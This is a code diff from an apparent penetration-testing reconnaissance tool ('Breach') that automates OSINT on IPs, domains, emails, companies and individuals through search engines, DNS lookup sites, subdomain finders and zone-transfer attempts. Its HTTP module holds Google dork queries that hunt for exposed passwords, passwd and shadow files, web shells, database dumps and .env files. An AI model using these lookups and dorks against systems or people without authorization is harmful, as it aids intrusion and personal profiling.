+def opn(url):
+  webbrowser.open_new_tab(url)
+
+def search_google(target, term, module, strict=True):
+  # ! google does not support proxies
+  if Breach.switch: # use global switch to check if we are googling, if yes delay execution
+    time.sleep(randrange(4, 8))
+  else:
+    Breach.switch = True
+
+  strict = "-x" if strict else ""
+  output = run_quick_cmd(F"googler '{term}' {strict} --np")
+  if "Connection blocked due to unusual activity" in str(output):
+    tqdm.write(F"{Breach.red}Google is blocking us. Solve Captcha with burp proxy (broken?). Press Enter when done.{Breach.endc}", end='', file=sys.stderr)
+    input()
+    output = run_quick_cmd(F"googler '{term}' {strict} --np")
+  
+  if not "No Result" in output:
+    outstring = F"{Breach.blue}# {target}: googler '{term}' {strict} --np"[:Breach.ttywidth-5] + Breach.endc
+    if Breach.notty:
+      tqdm.write(outstring)
+    else:
+      tqdm.write(outstring + "\n" + output)
+    if not Breach.nofile:
+      with open(module + "_osint.md", "a") as fil:
+        date = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+        fil.write(F"\n# {target} ({date}): googler '{term}' {strict} --np\n{output}\n")
+
+def simple_request(url, post=False):
+  try:
+    if post:
+      response = Breach.driver.request('POST', url, data=post, timeout=10)
+      return response.text
+    else:
+      response = Breach.driver.request('GET', url, timeout=10)
+      return response.text
   except Exception as e:
-    print(F"{Breach.colors.GREEN}[-] Something went wrong - check wordlist path OR request timed out{Breach.colors.ENDC}")
     print(e)
+    tqdm.write(Breach.red + F"Error on {url}" + Breach.endc)
+    return False
+
+def rapid_check_shared(ip):
+  """ this is used by osint_ip and by breach domain -i """
+  url = f"https://rapiddns.io/sameip/{ip}?full=1#result"
+  r = requests.get(url)
+  soup = BeautifulSoup(r.text, 'html.parser')
+  rows = soup.find_all('tr')  
+  results = []
+
+  for row in rows[1:]:
+    data =  row.get_text().split('\n') # 2: Domain, 3: Address
+    dom = data[2]
+    addr = data[3]
+    if addr[-1] == '.':
+      addr = addr[:-1]
+    results.append(addr + ":" + dom)
+
+  if results:
+    tqdm.write(F"{Breach.blue}# {ip}: {url}"[:Breach.ttywidth-5] + Breach.endc)
+    
+    if (len(results) > 25):
+      tqdm.write(Breach.red + F"Found >25 domains for single ip {ip} (likely shared hosting). Saving results (max 100) to ip_sharedhosting.ip" + Breach.endc)
+      for i, result in enumerate(results):
+        if i >= 100:
+          break
+        with open("ip_sharedhosting.ip", "a") as fil:
+          fil.write("\n" + result)
+      os.system("sort -u ip_sharedhosting.ip -o ip_sharedhosting.ip && sed -i '/^$/d' ip_sharedhosting.ip")
+    else:
+      for result in results:
+        if "googleusercontent" in result:
+          pass
+        elif result.count(":") > 4:
+          tqdm.write(result)
+          with open("ip_names_v6.ip", "a") as fil:
+            fil.write("\n" + result)
+        else:
+          tqdm.write(result)
+          with open("ip_names.ip", "a") as fil:
+            fil.write("\n" + result)
+          with open("domain_subs.domain", "a") as fil: # write additional subs to file
+            fil.write("\n" + result.split(":")[1])
+          
+          result_ip = result.split(":")[0]
+          bydns = False
+          if result_ip not in open('ip_scope.ip').read():
+            bydns = True
+            with open("ip_bydns.ip", "a") as fil:
+              fil.write("\n" + result_ip)
+          os.system("sort -u domain_subs.domain -o domain_subs.domain && sed -i '/^$/d' domain_subs.domain")
+          os.system("sort -u ip_names.ip -o ip_names.ip && sed -i '/^$/d' ip_names.ip")
+          if bydns:
+            os.system("sort -u ip_bydns.ip -o ip_bydns.ip && sed -i '/^$/d' ip_bydns.ip")   
+        
+def loot_html(target, html, module, url, pre_assert=False, pre_bl=False,
+              rm_before=False, rm_after=False, rm_word=False,
+              wl_id=False, wl_class=False, wl_css=False, wl_name=False, wl_tag=False, wl_xpath=False, wl_all=False,
+              wl_line=False, wl_word=False, bl_line=False, bl_word=False):
+  '''
+  target          target (for output)
+  html            source code to analyze
+  module          module used for output file
+  url             url (for output)
+  
+  pre_assert      regular expression to make sure request succeded
+  pre_bl          regular expression which blacklists whole response (e.g. No Result)
+  
+  rm_before       post extract remove everything before this string
+  rm_after        post extract remove everything after this string
+  rm_word         words to remove before extraction (array)
+
+  wl_id           extract elements with this id
+  wl_class        extract elements with this class
+  wl_css          extract elements with this css
+  wl_name         extract elements with this name
+  wl_tag          extract elements with this tag
+  wl_xpath        extract elements with this xpath
+  wl_all          extract all elements
+  
+  wl_line         post extract only keep lines containing this word
+  wl_word         post extract only keep these words  
+  bl_line         post extract remove lines containing this word
+  bl_word         post extract remove these words (regex)
+  '''
+  
+  # ! pre extraction assertion and filter
+  if pre_assert and not re.search(pre_assert, html):
+    print(F"Assertion failed on url")
+    return ""
+  elif pre_bl and re.search(pre_bl, html):
+    tqdm.write(F"{Breach.cyan}No results found for {target} on {url}{Breach.endc}")
+    return ""
+  if rm_before:
+    html = html.partition(rm_before)[-1]
+  if rm_after:
+    html = html.partition(rm_after.lower())[0] if rm_after.lower() in html.lower() else html
+  if rm_word:
+    for word in rm_word:
+      html = html.replace(word, "", -1)
+      
+  # ! get whitelisted elements
+  soup = BeautifulSoup(html, "html.parser")
+  filtered_elements = []
+  if wl_id:
+    for element_id in wl_id:
+      filtered_elements += soup.find_all(id=element_id)
+  if wl_class:
+    for class_name in wl_class:
+      filtered_elements += soup.find_all(class_=class_name)
+  if wl_css:
+    for css_selector in wl_css:
+      filtered_elements += soup.select(css_selector)
+  if wl_name:
+    for element_name in wl_name:
+      filtered_elements += soup.find_all(attrs={"name": element_name})
+  if wl_tag:
+    for tag_name in wl_tag:
+      filtered_elements += soup.find_all(tag_name)
+  if wl_xpath:
+    soup = BeautifulSoup(html, "lxml")
+    for xpath in wl_xpath:
+      filtered_elements += soup.xpath(xpath)
+  if wl_all:
+    filtered_elements = soup
+
+  filtered_output = [element.get_text() for element in filtered_elements]
+  output = "\n".join([line.strip() for line in filtered_output if line.strip()])
+
+  # ! post extract whitelist / blacklist
+  if wl_line:
+    output = '\n'.join([line for line in output.split('\n') if any(word in line for word in wl_line) and line.strip()])
+  if wl_word:
+      output = '\n'.join([line for line in output.split('\n') if any(word in line for word in wl_word)])
+  if bl_line:
+    output = '\n'.join([line for line in output.split('\n') if not any(word in line for word in bl_line) and line.strip()])
+  if bl_word:
+    for word in bl_word:
+      output = re.sub(word, "", output)
+
+  # ! cleanup and print
+  output = "\n".join([x for x in output.split('\n') if x.strip()])  # Remove empty lines
+  # output = "\n".join(list(dict.fromkeys(output.split("\n"))))       # Remove duplicates without sorting
+  if output != "":
+    outstring = F"{Breach.blue}# {target}: {url}"[:Breach.ttywidth-5] + Breach.endc
+    tqdm.write(outstring)
+    ttyout = output.split("\n")
+    if len(ttyout) > 20:
+      ttyout = "\n".join(ttyout[:10]) + "\nTRUNCATED: full output in " +module+ "_osint.md"
+    else:
+      ttyout = output
+    tqdm.write(ttyout)
+
+    with open(module + "_osint.md", "a") as fil:
+      date = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+      fil.write(F"\n# {target} ({date}): {url}\n{output}\n")
+
+def osint_ip(target):
+  def get_dnsdumpster(url):
+    try:
+      Breach.driver.get(url)
+      Breach.driver.find_element(by=By.ID, value="regularInput").send_keys(target)
+      Breach.driver.find_element(by=By.CLASS_NAME, value="btn-default").click()
+      return Breach.driver.page_source
+    except Exception as e:
+      print(e)
+      tqdm.write(Breach.red + F"Error on {url}. Skipping..." + Breach.endc)
+      return False
+  def get_dnslytics(url):
+    try:
+      Breach.driver.get(url)
+      Breach.driver.find_element(by=By.NAME, value="reverseip").clear()
+      Breach.driver.find_element(by=By.NAME, value="reverseip").send_keys(target)
+      Breach.driver.find_element(By.CSS_SELECTOR, 'input[value="Go"]').click()
+      return Breach.driver.page_source
+    except Exception as e:
+      print(e)
+      tqdm.write(Breach.red + F"Error on {url}. Skipping..." + Breach.endc)
+      return False
+  def get_centralops(url):
+    try:
+      Breach.driver.get(url)
+      Breach.driver.find_element(by=By.ID, value="addr").clear()
+      Breach.driver.find_element(by=By.ID, value="addr").send_keys(target)
+      Breach.driver.find_element(by=By.ID, value="dom_whois").click()
+      Breach.driver.find_element(by=By.ID, value="dom_dns").click()
+      Breach.driver.find_element(by=By.ID, value="net_whois").click()
+      Breach.driver.find_element(by=By.ID, value="go").click()
+      return Breach.driver.page_source
+    except Exception as e:
+      print(e)
+      tqdm.write(Breach.red + F"Error on {url}. Skipping..." + Breach.endc)
+      return False
+  
+  if not Breach.driver:
+    if Breach.osint_proxy:
+      tqdm.write(Breach.cyan+"using proxy for osint. clis require proxychains to be setup accordingly!\n"+Breach.endc)
+    init_driver()
+  
+  # ! clis
+  if Breach.osint_proxy:
+    cli_proxy = "proxychains -q "
+  else:
+    cli_proxy = ""
+  search_google(target, target, "ip")
+  # TODO: spamhaus.zen unreliable?
+  run_cmd(F"curl https://api.hackertarget.com/ipgeo/?q={target}", "ip_osint.md", target, tout=10)
+  run_cmd(F"dig +short {target}.zen.spamhaus.org", "ip_blacklisted.md", target, tout=10)
+  run_cmd(F"{cli_proxy}ddgr '\"{target}\"' -x --np", "ip_osint.md", target, bl=["No Results"], tout=10)
+
+  # ! manual inspection
+  # TODO: Automate login  
+  opn(F"https://www.shodan.io/host/{target}")
+  opn(F'https://community.riskiq.com/research?query={target}')
+  opn(F"https://www.zoomeye.org/searchResult?q={target}")
+
+  # ! rapiddns
+  rapid_check_shared(target)
+
+  # ! viewdns
+  viewdns = simple_request(F"https://viewdns.info/reverseip/?host={target}&t=1")
+  if viewdns:
+    loot_html(target, viewdns, "ip", F"https://viewdns.info/reverseip/?host={target}&t=1",
+              pre_assert="Takes a domain or IP address", pre_bl="There are 0 domains",
+              rm_before="Last Resolved Date", rm_after="</table>",
+              wl_tag=["td"],)
+  
+  # ! robtex
+  robtex = simple_request(F"https://www.robtex.com/ip-lookup/{target}")
+  if robtex:
+    loot_html(target, robtex, "ip", F"https://www.robtex.com/ip-lookup/{target}",
+              pre_assert="THREATMINER", pre_bl="There are 0 domains", rm_word=["<b>"],
+              rm_before="Using as IP number", rm_after="rtfrage_visgraph",
+              wl_tag=["a"])
+    
+  # ! dnsdumpster
+  dnsdumpster = get_dnsdumpster(F"https://dnsdumpster.com/")
+  if dnsdumpster:
+    loot_html(target, dnsdumpster, "ip", F"https://dnsdumpster.com/",
+              pre_assert="Showing results for", pre_bl="No results found. Try another subnet.",
+              rm_before="<tbody>", rm_after="</tbody>",
+              wl_tag=["td"])
+
+  # ! dnslytics
+  dnslytics = get_dnslytics(F"https://dnslytics.com/reverse-ip")  
+  if dnslytics:
+    loot_html(target, dnslytics, "ip", F"https://dnslytics.com/reverse-ip",
+              pre_assert="domain", pre_bl="Found 0 domains",
+              rm_before='domainresults', rm_after='hidden-xs deeplink',
+              wl_css=["td>b:nth-child(1)"])
+    
+  # ! centralops
+  centralops = get_centralops(F"https://centralops.net/co/DomainDossier.aspx")
+  if centralops:
+    loot_html(target, centralops, "ip", F"https://centralops.net/co/DomainDossier.aspx",
+              pre_assert="Do you see Whois", pre_bl="There are 0 domains",
+              rm_before='Address lookup', rm_after='-- end --', rm_word=["<b>", "</b>"],
+              wl_all=True, bl_line=["REDACTED FOR PRIVACY"])
+
+def osint_email(target):
+  def get_haveibeenpwned(url):
+    try:
+      Breach.driver.get(url)
+      Breach.driver.find_element(by=By.ID, value="Account").clear
+      Breach.driver.find_element(by=By.ID, value="Account").send_keys(target)
+      Breach.driver.find_element(by=By.ID, value="searchPwnage").click()
+      time.sleep(2)
+      return Breach.driver.page_source
+    except Exception as e:
+      print(e)
+      tqdm.write(Breach.red + F"Error on {url}" + Breach.endc)
+      return False
+  
+  if not Breach.driver:
+    init_driver()
+  
+  # ! clis
+  if Breach.osint_proxy:
+    cli_proxy = "proxychains -q "
+  else:
+    cli_proxy = ""
+  search_google(target, target, "email")
+  run_cmd(F"{cli_proxy}ddgr '\"{target}\"' -x --np", "email_osint.md", target, bl=["No Results"], tout=10)
+
+  # ! manual inspection  
+  # None
+
+  # ! haveibeenpwned
+  haveibeenpwned = get_haveibeenpwned(F"https://haveibeenpwned.com/")
+  if haveibeenpwned:
+    loot_html(target, haveibeenpwned, "email",
+              url=F"https://haveibeenpwned.com/",
+              pre_assert="Check if your email", pre_bl="<h2>DOES NOT OWRKGood news — no pwnage found!</h2>",
+              rm_before='pwnedSearchResult', rm_after='Largest breaches', 
+              wl_class=["pwnedCompanyTitle"], wl_tag=["h3"],
+              bl_line=["3 Steps", "Largest breaches", "Recently added breaches"], bl_word=[":"], outf="osint_beenpwned.md")
+
+def osint_domain(target):
+  def get_dnsdumpster(url):
+    try:
+      Breach.driver.get(url)
+      Breach.driver.find_element(by=By.ID, value="regularInput").send_keys(target)
+      Breach.driver.find_element(by=By.CLASS_NAME, value="btn-default").click()
+      return Breach.driver.page_source
+    except Exception as e:
+      print(e)
+      tqdm.write(Breach.red + F"Error on {url}. Skipping..." + Breach.endc)
+      return False
+  def get_centralops(url):
+    try:
+      Breach.driver.get(url)
+      Breach.driver.find_element(by=By.ID, value="addr").clear()
+      Breach.driver.find_element(by=By.ID, value="addr").send_keys(target)
+      Breach.driver.find_element(by=By.ID, value="dom_whois").click()
+      Breach.driver.find_element(by=By.ID, value="dom_dns").click()
+      Breach.driver.find_element(by=By.ID, value="net_whois").click()
+      Breach.driver.find_element(by=By.ID, value="go").click()
+      return Breach.driver.page_source
+    except Exception as e:
+      print(e)
+      tqdm.write(Breach.red + F"Error on {url}. Skipping..." + Breach.endc)
+      return False
+  def rapid_check_subs(domain):
+    url = f"https://rapiddns.io/s/{domain}?full=1#result"
+    r = requests.get(url)
+    # TODO: add assertion for successful request
+    soup = BeautifulSoup(r.text, 'html.parser')
+    rows = soup.find_all('tr')
+    results = []
+
+    for row in rows[1:]:
+      data =  row.get_text().split('\n') # 2: Domain, 3: Address
+      dom = data[2]
+      addr = data[3]
+      if addr[-1] == '.':
+        addr = addr[:-1]
+      results.append(addr + ":" + dom)
+
+    if results:
+      tqdm.write(F"{Breach.blue}# {domain}: {url}"[:Breach.ttywidth-5] + Breach.endc)
+      for result in results:
+        if "googleusercontent" in result:
+          pass
+        elif result.count(":") > 4:
+          with open("ip_names_v6.ip", "a") as fil:
+            fil.write("\n" + result)        
+        else:
+          tqdm.write(result)
+          with open("ip_names.ip", "a") as fil:
+            fil.write("\n" + result)
+          with open("domain_subs.domain", "a") as fil:
+            fil.write("\n" + result.split(":")[1])
+          os.system("sort -u ip_names.ip -o ip_names.ip && sed -i '/^$/d' ip_names.ip")
+          os.system("sort -u domain_subs.domain -o domain_subs.domain && sed -i '/^$/d' domain_subs.domain")
+  
+  if not Breach.driver:
+    init_driver()
+  
+  # ! clis
+  if Breach.osint_proxy:
+    cli_proxy = "proxychains -q "
+  else:
+    cli_proxy = ""
+  search_google(target, target, "domain")
+  search_google(target, "site:*." + target + " -www", "domain")
+  search_google(target, "site:*.*." + target + " -www", "domain")
+  search_google(target, "site:pastebin.com '" + target + "'", "domain")
+
+  run_cmd(F"{cli_proxy}ddgr '\"{target}\"' -x --np", "domain_osint.md", target, bl=["No Results"], tout=10)
+  run_cmd(F"theHarvester -r -n -c -d {target}", "domain_osint.md", target, post="""
+          echo "" >> ip_names.ip && grep -oP '\b[A-Za-z0-9.-]+\.[A-Za-z0-9.-]+:[0-9.]+\b' domain_osint.md | awk -F':' '{print $2\":\"$1}' >> ip_names.ip
+          sort -u ip_names.ip -o ip_names.ip
+          echo "" >> domain_subs.domain && grep -oP '\b[A-Za-z0-9.-]+\.[A-Za-z0-9.-]+:[0-9.]+\b' domain_osint.md | awk -F':' '{print $1}' >> domain_subs.domain
+          sort -u domain_subs.domain -o domain_subs.domain
+          """)
+  run_cmd("subfinder -d "+target+" -silent", "domain_subs.domain", target, sort=2,
+          post='cat domain_subs.domain | grep -v "# " | sort -u -o domain_subs.domain') 
+  run_cmd(F"dnsrecon -d {target}", "domain_osint.md", target)
+  run_cmd(F"dnsrecon -t axfr -d {target}", "domain_osint.md", target)
+  
+  # ! manual inspection 
+  opn(F"https://www.shodan.io/domain/" + target)
+  opn(F"https://rapiddns.io/s/" + target + "#result")
+  opn(F'https://crt.sh/?q=' + target)
+  opn(F"http://dnshistory.org/dns-records/" + target)
+  opn(F"https://community.riskiq.com/research?query=" + target)
+  opn(F"http://www.skymem.info/srch?q=" + target + "&ss=home")
+  opn(F"https://hunter.io/search/" + target)
+  opn(F'https://phonebook.cz/')
+  
+  # ! rapiddns
+  rapid_check_subs(target)
+  
+  # ! dnsdumpster
+  dnsdumpster = get_dnsdumpster(F"https://dnsdumpster.com/")
+  if dnsdumpster:
+    loot_html(target, dnsdumpster, "domain", F"https://dnsdumpster.com/",
+              pre_assert="Showing results for", pre_bl="No results found. Try another subnet.",
+              rm_before="<tbody>", rm_after="</tbody>",
+              wl_tag=["td"])
+  
+  # ! centralops
+  centralops = get_centralops(F"https://centralops.net/co/DomainDossier.aspx")
+  if centralops:
+    loot_html(target, centralops, "domain", F"https://centralops.net/co/DomainDossier.aspx",
+              pre_assert="Do you see Whois", pre_bl="There are 0 domains",
+              rm_before='Address lookup', rm_after='-- end --', rm_word=["<b>", "</b>"],
+              wl_all=True, bl_line=["REDACTED FOR PRIVACY"])
+  
+  # ! viewdns (dnsreport)
+  viewdns = simple_request(F"https://viewdns.info/dnsreport/?domain={target}&t=1")
+  if viewdns:
+    loot_html(target, viewdns, "domain", F"https://viewdns.info/dnsreport/?domain={target}&t=1",
+              pre_assert="DNS Report for", pre_bl="I can't find that domain at all",
+              rm_before="DNS Report for", rm_after="viewdns-bottom-linkunit",
+              wl_tag=["td"], wl_line=["Oops"])
+  
+  # ! viewdns (iphistory)
+  viewdns = simple_request(F"https://viewdns.info/iphistory/?domain={target}&t=1")
+  if viewdns:
+    loot_html(target, viewdns, "domain", F"https://viewdns.info/iphistory/?domain={target}&t=1",
+              pre_assert="IP history results", pre_bl="Unfortunately we do not have",
+              rm_before="IP history results", rm_after="</table>",
+              wl_tag=["td"],)
+
+  # ! viewdns (dnsrecords)
+  viewdns = simple_request(F"https://viewdns.info/dnsrecord/?domain={target}&t=1")
+  if viewdns:
+    loot_html(target, viewdns, "domain", F"https://viewdns.info/dnsrecord/?domain={target}&t=1",
+              pre_assert="DNS Records for",
+              rm_before="DNS Records for", rm_after="</table>",
+              wl_tag=["td"], bl_word=[target+".", "IN", "3600", "600", "300","TTL", "Class", "Type", "Priority"])
+    
+def osint_company(target):
+  if not Breach.driver:
+    if Breach.osint_proxy:
+      tqdm.write(Breach.cyan+"using proxy for osint. clis require proxychains to be setup accordingly!\n"+Breach.endc)
+    init_driver()
+  
+  # ! clis
+  if Breach.osint_proxy:
+    cli_proxy = "proxychains -q "
+  else:
+    cli_proxy = ""
+  search_google(target, target, "company")
+  # TODO: spamhaus.zen unreliable?
+  run_cmd(F"curl https://api.hackertarget.com/ipgeo/?q={target}", "company_osint.md", target, tout=10)
+  run_cmd(F"dig +short {target}.zen.spamhaus.org", "osint_blacklist.md", target, tout=10)
+  run_cmd(F"{cli_proxy}ddgr '\"{target}\"' -x --np", "company_osint.md", target, bl=["No Results"], tout=10)
+
+  # ! manual inspection
+  opn(F'https://www.northdata.de/' + target)
+  opn(F"https://www.google.com/search?q=site:linkedin.com+employees+" + target)
+  opn(F"https://www.bundesanzeiger.de/")
+  opn(F"https://www.crunchbase.com/")
+  opn(F"https://github.com/search?q=" + target)
+  opn(F"https://www.shodan.io/search?query=org:{target}")
+  opn(F'https://community.riskiq.com/research?query={target}')
+  opn(F"https://www.zoomeye.org/searchResult?q={target}")
+  opn(F'https://www.linkedin.com/jobs/search/?keywords=' + target)
+  opn(F'https://www.kununu.com/de/search#/?country=COUNTRY_DE&q=' + target)
+  opn(F'https://de.indeed.com/Jobs?q=' + target)
+  opn(F'https://www.monster.com/jobs/search/?where=Germany&q=' + target)
+  opn(F'https://www.google.com/maps/search/' + target)
+  opn(F'https://twitter.com/search?q=' + target)
+
+def osint_http(target):
+  if not Breach.driver:
+    init_driver()
+  
+  # ! clis
+  if Breach.osint_proxy:
+    cli_proxy = "proxychains -q "
+  else:
+    cli_proxy = ""
+  search_google(target, target, "http")
+  run_cmd(F"{cli_proxy}ddgr '\"{target}\"' -x --np", "http_osint.md", target, bl=["No Results"], tout=10)
+  gbase = "site:" + target + " "
+  search_google(target, gbase + "-ext:html", "http")
+  search_google(target, gbase + "username | password | login | root | admin", "http")
+  search_google(target, gbase + "intitle:\"index of\" | intext:\"index of /\" | intext:\"parent directory\"", "http")
+  search_google(target, gbase + "inurl:login | inurl:admin | inurl:user | inurl:cpanel | inurl:account | inurl:moderator | inurl:/cp", "http")
+  search_google(target, gbase + "inurl:shell | inurl:backdoor | inurl:wso | inurl:cmd | shadow | passwd | boot.ini | inurl:backdoor", "http")
+  search_google(target, gbase + "inurl:readme | inurl:license | inurl:install | inurl:setup | inurl:config", "http")
+  search_google(target, gbase + "inurl:plugin | inurl:upload | inurl:download", "http")
+  search_google(target, gbase + "inurl:email | inurl:wp-", "http")
+  search_google(target, gbase + "inurl:redir | inurl:url | inurl:redirect | inurl:return | inurl:Fsrc=http | inurl:r=http", "http")
+  search_google(target, gbase + "ext:pdf", "http")
+  search_google(target, gbase + "ext:cgi | ext:php | ext:asp | ext:aspx | ext:jsp | ext:jspx | ext:swf | ext:fla | ext:xml", "http")
+  search_google(target, gbase + "ext:csv | ext:txt | ext:bak", "http")
+  search_google(target, gbase + "ext:action | struts", "http")
+  search_google(target, gbase + "ext:sql | ext:dbf | ext:mdb | ext:log |ext:env", "http")
+  search_google(target, gbase + "ext:bkf | ext:bkp | ext:bak | ext:old | ext:backup", "http")
+  search_google(target, gbase + "ext:doc | ext:docx | ext:odt | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv", "http")
+  search_google(target, gbase + "ext:xlsx | ext:xls | ext:xlsb | ext:xlsm", "http")
+  search_google(target, gbase + "ext:php intitle:phpinfo \"published by the PHP Group\"", "http")
+  search_google(target, gbase + "intext:\"sql syntax near\" | intext:\"syntax error has occurred\" | intext:\"incorrect syntax near\" | intext:\"unexpected end of SQL command\" | intext:\"Warning: mysql_connect()\" | intext:\"Warning: mysql_query()\" | intext:\"Warning: pg_connect()\"", "http")
+
+  # ! manual inspection  
+  opn(F'https://web.archive.org/web/*/' + target)
+  opn(F"https://www.ssllabs.com/ssltest/analyze.html?d=" + target + "&latest")
+  opn(F"https://sitecheck.sucuri.net/")
+  opn(F'https://urlscan.io/')
+  opn(F'https://builtwith.com/' + target)
+  opn(F"https://urlquery.net")
+  opn(F'http://www.visualsitemapper.com/')
+
+def osint_person(target):
+  # ! manual inspection 
+  opn(F"https://www.google.com/search?q=" + target)
+  opn(F"https://duckduckgo.com/?q=" + target)
+  opn(F"https://www.bing.com/search?q=" + target)
+  opn(F"https://www.linkedin.com/search/results/all/?keywords=" + target)
+  opn(F"https://www.xing.com/search/members?keywords=" + target)
+  opn(F"https://www.facebook.com/search/people/?q={target}")
+  opn(F"https://www.instagram.com/search/{target}")
+  opn(F"https://www.northdata.de/" + target)
+  opn(F"https://webmii.com/people?n" + target)
+
+def osint_tel(target):
+  # ! manual inspection 
+  opn(F"https://www.google.com/search?q=" + target)
+  opn(F"https://duckduckgo.com/?q=" + target)
+  opn(F"https://www.bing.com/search?q=" + target)
+  opn(F"https://www.northdata.de/" + target)
+  
+def osint_site(target):
+  # ! manual inspection 
+  opn(F"https://www.google.com/search?q=" + target)
+  opn(F"https://duckduckgo.com/?q=" + target)
+  opn(F"https://www.bing.com/search?q" + target)
+  opn(F"https://www.zoomeye.org/searchResult?q=" + target)
+  opn(F"https://www.google.com/maps/search/" + target)
+
+# ! ################################################################## RUN 
+
+if (os.geteuid() == 0) and (not "microsoft" in run_quick_cmd("uname -a")):
+  exit("This script must not be run as root/sudo.. Exit.")
+if not "AM" in os.getcwd() and (not "microsoft" in run_quick_cmd("uname -a")):
+  input("You are not in an AM dir! Press Enter to continue...")
+
+parse_breachargs(sys.argv[1])
+if not Breach.quiet: print_banner()
+parse_targets()
+Breach.state = open("b.state", "r").read() if os.path.isfile("b.state") else ""
+if Breach.watch:
+  init_watch(Breach.watch)
+init_tmux_session()
+init_cmd_pool()
+
+try:
+  if Breach.single_target:
+    eval("breach_" + Breach.module)(Breach.targets)
+    time.sleep(1)
+  elif len(Breach.targets) > 1:
+    for target in tqdm(Breach.targets, leave=False):
+      eval("breach_" + Breach.module)(target)
+  else:
+    eval("breach_" + Breach.module)(Breach.targets[0])    
+  while (len(Breach.cmd_pool) > 0) or (Breach.threadpool > 0):
+    time.sleep(1)
+  if Breach.sort:
+    print("")
+    for fil in Breach.sort:
+      sort_markdown_file(fil)
+  Breach.post = list(dict.fromkeys(Breach.post)) # remove dups
+  for cmd in Breach.post:
+    print(Breach.cyan + "\nExecuting post routine: " + cmd + Breach.endc)
+    run_quick_cmd(cmd)
+  if Breach.driver:
+    Breach.driver.quit()
+  print(F"{Breach.green}\n[+] DONE [+]{Breach.endc}")
+except KeyboardInterrupt:
+  print(F"{Breach.red}\n\n[-] Detected Ctrl + C ... Killing threads{Breach.endc}")
+  while len(Breach.cmd_pool) > 0:
+    for running_cmd in Breach.cmd_pool:
+      running_cmd.pane.cmd('kill-pane')
+      Breach.cmd_pool.remove(running_cmd)
+  if Breach.driver:
+    Breach.driver.quit()
+  sys.exit()
+except Exception as e:
+  while len(Breach.cmd_pool) > 0:
+    for running_cmd in Breach.cmd_pool:
+      running_cmd.pane.cmd('kill-pane')
+      Breach.cmd_pool.remove(running_cmd)
+  if Breach.driver:
+    Breach.driver.quit()
+  print(F"{Breach.red}[-] Something went wrong [-]{Breach.endc}")
+  print(traceback.format_exc())
+  print(e)
